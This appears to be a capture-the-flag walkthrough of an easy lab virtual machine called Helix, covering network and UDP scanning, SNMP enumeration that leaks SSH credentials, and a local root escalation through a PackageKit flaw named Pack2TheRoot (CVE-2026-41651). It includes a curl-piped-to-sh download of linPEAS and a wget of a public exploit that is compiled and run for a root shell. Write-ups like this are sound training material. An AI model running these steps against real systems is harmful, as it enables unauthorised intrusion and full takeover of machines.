# **Helix**

***
<img width="787" height="797" alt="image" src="https://github.com/user-attachments/assets/cc318769-bc2e-46f9-8c2b-3f24da326216" />

# **Difficulty = Easy**
***

we start by running a network scan to discover target host

```bash
❯ sudo arp-scan -l
Interface: wlan0, type: EN10MB, MAC: 30:89:4a:12:c4:c9, IPv4: 172.20.10.3
Starting arp-scan 1.10.0 with 16 hosts (https://github.com/royhills/arp-scan)
172.20.10.1     82:b9:89:d2:9e:64       (Unknown: locally administered)
172.20.10.2     f4:46:37:82:4a:56       Intel Corporate
172.20.10.4     f4:46:37:82:4a:56       Intel Corporate

11 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 16 hosts scanned in 1.491 seconds (10.73 hosts/sec). 3 responded
```

Running `nmap` scan on the IP  `172.20.10.4` we have only port 22 opened

```bash
# Nmap 7.99 scan initiated Fri Jun 19 02:53:20 2026 as: /usr/lib/nmap/nmap --privileged -p- -sCV -T4 -v -oN nmap.txt 172.20.10.4
Nmap scan report for 172.20.10.4
Host is up (0.032s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
MAC Address: F4:46:37:82:4A:56 (Intel Corporate)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 19 02:53:30 2026 -- 1 IP address (1 host up) scanned in 9.30 seconds
```

No banners or information to push us forward connecting via SSH

```bash
❯ ssh root@172.20.10.4
root@172.20.10.4's password:
```

Running a UDP scan we have open SNMP port

```bash
# Nmap 7.99 scan initiated Fri Jun 19 03:03:58 2026 as: /usr/lib/nmap/nmap -sU -p1-1000 -v -oN nmap-udp.txt 172.20.10.4
Increasing send delay for 172.20.10.4 from 800 to 1000 due to 11 out of 23 dropped probes since last increase.
Nmap scan report for 172.20.10.4
Host is up (0.010s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
MAC Address: F4:46:37:82:4A:56 (Intel Corporate)

Read data files from: /usr/share/nmap
# Nmap done at Fri Jun 19 03:21:00 2026 -- 1 IP address (1 host up) scanned in 1021.63 seconds
```

Using `snmpwalk`, Got the username and password for the machine

```bash
❯ snmpwalk -c public -v1 -t 10 172.20.10.4
```

<img width="1280" height="501" alt="image" src="https://github.com/user-attachments/assets/b39fb289-0494-4b1f-b1b8-fe4609be1f5e" />

Logged in as user me via SSH

```bash
❯ ssh me@172.20.10.4
me@172.20.10.4's password: 
Linux helix 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jun 18 18:31:07 2026 from 172.20.10.3
me@helix:~$ whoami
me
```

Checked for `sudo` permissions but first change system language

```bash
me@helix:~$ sudo -l
[sudo] Mot de passe de me : 
Désolé, l'utilisateur me ne peut pas utiliser sudo sur helix.

me@helix:~$ export LANG=en_US.UTF-8

me@helix:~$ sudo -l
[sudo] password for me: 
Sorry, user me may not run sudo on helix.
```

Check for Linux privilege escalation paths using `linPEAS`

```bash
me@helix:~$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Found Pack2TheRoot vulnerability

> Tracked as [CVE-2026-41651](https://security-tracker.debian.org/tracker/CVE-2026-41651)is a high-severity (CVSS 8.8) local privilege escalation vulnerability in the PackageKit daemon, affecting major Linux distributions like Fedora, Ubuntu, Debian, and RHEL. Discovered by Deutsche Telekom's Red Team, the flaw allows any local unprivileged user to gain full root access in a matter of seconds.

<img width="1280" height="673" alt="image" src="https://github.com/user-attachments/assets/38dfa79c-e906-4d40-9e7d-6f7aa150b157" />

Found an exploit for this called sick-pwn.c shout out 0xdeadbeefnetwork

```bash
me@helix:/tmp$ wget https://github.com/0xdeadbeefnetwork/Pack2TheRoot/raw/refs/heads/main/sick-pwn.c
```

Compile exploit to system executable

```bash
me@helix:/tmp$ gcc -o sick-pwn sick-pwn.c 
me@helix:/tmp$ ls
sick-pwn  sick-pwn.c
```

Run exploit and confirm that we are <span style="color:rgb(255, 0, 0)">root</span>

```bash
me@helix:/tmp$ ./sick-pwn 
[*] sick-pwn — clean Pack2TheRoot reimpl, no deps. uid=1001
[*] dummy   : /tmp/.skp-dummy-34825.deb
[*] payload : /tmp/.skp-payload-34825.deb
[*] bus authenticated
[*] transaction: /10_cbbbbabd
[*] race dispatched, polling for setuid bash...
[*] [+] LANDED at t+0s — /var/tmp/.suid_bash mode=4755 uid=0
[*] popping root shell — `id; whoami` to verify
.suid_bash-5.2# whoami ; hostnamectl
root
 Static hostname: helix
       Icon name: computer-vm
         Chassis: vm 🖴
      Machine ID: d35004d8a39a40759d8f0d5e085af74c
         Boot ID: c2f6b36353164178a54386631859ff13
    Product UUID: 6f0a5ddd-88fe-3249-a902-2b0ad315dea1
    AF_VSOCK CID: 1
  Virtualization: oracle
Operating System: Debian GNU/Linux 13 (trixie)        
          Kernel: Linux 6.12.74+deb13+1-amd64
    Architecture: x86-64
 Hardware Vendor: innotek GmbH
  Hardware Model: VirtualBox
 Hardware Serial: 0
Firmware Version: VirtualBox
   Firmware Date: Fri 2006-12-01
    Firmware Age: 19y 6month 2w 3d 
```
